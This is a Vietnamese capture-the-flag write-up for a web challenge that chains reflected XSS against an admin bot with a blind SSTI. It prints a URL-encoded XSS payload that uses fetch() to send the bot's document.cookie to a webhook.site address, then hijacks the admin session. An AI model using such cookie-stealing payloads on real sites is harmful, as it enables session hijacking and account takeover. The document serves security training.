<img width="842" height="631" alt="image" src="https://github.com/user-attachments/assets/d48d5151-ea3e-43f7-a2df-617dcff4c17a" />

Mục tiêu: chiếm quyền admin để tìm flag. Ở đây ta thấy server chỉ nhận url bắt đầu với http://localhost:5000
Ta chèn payload vào trong link để có thể nhận được cookie từ server trả về. Dùng webhook để hứng request. 

https://webhook.site/3e52a83b-4c1d-44d1-932e-ce682e9540bc

Nhưng ta cần encode để server xử lý đúng tham số URL khi bot truy cập

http://localhost:5000/home?name=%3Cimg%20src%3Dx%20onerror%3Dfetch(%27https%3A%2F%2Fwebhook.site%2F3e52a83b-4c1d-44d1-932e-ce682e9540bc%2F%3Fc%3D%27%2Bdocument.cookie)%3E

<img width="549" height="87" alt="image" src="https://github.com/user-attachments/assets/a1122ddc-6d9d-4edf-b5cf-b76074b9a658" />

Sửa cookie seesion của web bằng cookie nhận được 

<img width="336" height="508" alt="image" src="https://github.com/user-attachments/assets/559710cc-1e85-4406-b04a-ed42c3f0c606" />

Tên extension: cookie editor, không thì sửa luôn trong inspect cũng đc:))

Reload trang thì ta đã là admin

![Screenshot 2025-12-14 150535](https://github.com/user-attachments/assets/e6c16b92-2933-43f5-b92b-15867dfa4103)

Truy cập vào admin panel ta sẽ thấy file backup của web, battle data generator, truy cập vào battle data generator.

<img width="989" height="625" alt="image" src="https://github.com/user-attachments/assets/9eaac44b-d5f3-4982-8fe6-30bbd6db38dd" />

Từ file app.py trong backup, ta thấy được lỗ hổng SSTI nằm ở đây

<img width="613" height="498" alt="image" src="https://github.com/user-attachments/assets/e28412cc-80b0-475e-bb17-6336c0369c51" />

Chỗ này có 3 phần chính:
1. <img width="142" height="36" alt="image" src="https://github.com/user-attachments/assets/02b19f7f-0004-429a-866a-1fd22aa4eb2e" />

Xác nhận cần quyền admin để truy cập endpoint.

2. <img width="585" height="73" alt="image" src="https://github.com/user-attachments/assets/ed7aa766-5260-4031-a5a1-ed17e7787a83" />

Giới hạn độ dài là 55 nên ta không thể sử dụng các payload tấn công dài.

3. <img width="189" height="57" alt="image" src="https://github.com/user-attachments/assets/701f8818-f0ae-4759-809c-97bdd88da17d" />

Mọi lỗi đều bị bắt và bỏ qua. Server không trả lại output ra màn hình, buộc ta phải dùng kỹ thuật Out-of-Band (OOB) để lấy Flag, này là blind ssti

Để bypass, ta sẽ không nhập payload qua ô content mà sẽ nhập vào qua console.

<img width="789" height="383" alt="image" src="https://github.com/user-attachments/assets/d5528748-fc8a-42f6-80bf-3727dc1637d2" />

Đoạn này dùng Gemini để nó viết Payload:))

Giờ ta sang lại bên webhook để tìm flag

<img width="338" height="81" alt="image" src="https://github.com/user-attachments/assets/5708f5e8-8a35-4930-9849-c1e434d5cead" />

Flag: KCSC{G0tt4_h4ck_'3m_4ll!}

